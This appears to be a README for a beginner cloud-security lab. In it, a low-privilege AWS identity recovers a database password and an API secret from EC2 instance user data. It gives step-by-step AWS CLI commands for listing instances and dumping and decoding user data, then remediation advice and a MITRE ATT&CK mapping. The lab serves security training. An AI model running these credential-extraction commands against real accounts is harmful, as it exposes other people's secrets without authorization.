# EC2 User Data Secret Exposure

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Compute / Credential Exposure

## Scenario

A developer hardcoded a database password and an API secret directly in the EC2 instance
**user data** bootstrap script, intending to "move them to SSM later". EC2 user data is stored
in plaintext and is retrievable via the EC2 API by any IAM principal with
`ec2:DescribeInstanceAttribute` — no SSH or console access required.

Read-only "cloud auditor" IAM policies routinely include this action without realising
it exposes every secret ever placed in a bootstrap script.

## Attack Path

```
[Attacker] cloud-auditor-<id> (ec2:DescribeInstances + ec2:DescribeInstanceAttribute)
    |
    v
aws ec2 describe-instances  -->  find instance ID
    |
    v
aws ec2 describe-instance-attribute --attribute userData  -->  base64 blob
    |
    v
base64 -d  -->  bootstrap script with DB_PASS + API_SECRET
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — Find the instance

```bash
aws ec2 describe-instances --profile attacker \
  --query "Reservations[].Instances[].{ID:InstanceId,Name:Tags[?Key=='Name']|[0].Value}" \
  --output table
```

### Step 3 — Dump the user data

```bash
INSTANCE_ID="<instance_id>"

aws ec2 describe-instance-attribute \
  --instance-id "${INSTANCE_ID}" \
  --attribute userData \
  --profile attacker \
  --query "UserData.Value" \
  --output text | base64 -d
```

## How to Fix in Production

1. **Never store secrets in user data** — bootstrap scripts are readable by any EC2 API caller with the right permissions.
2. **Use AWS Systems Manager Parameter Store or Secrets Manager** — retrieve secrets at runtime using the instance role, not the bootstrap script.
3. **Rotate any credentials that appeared in user data** — treat them as compromised.
4. **Restrict `ec2:DescribeInstanceAttribute`** — consider excluding this from general read-only policies or scoping it by resource tag.
5. **Use IMDSv2** and enforce it at the instance level to prevent unauthenticated metadata access from within the instance.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Infrastructure Discovery | T1580 |
| Valid Accounts: Cloud Accounts | T1078.004 |
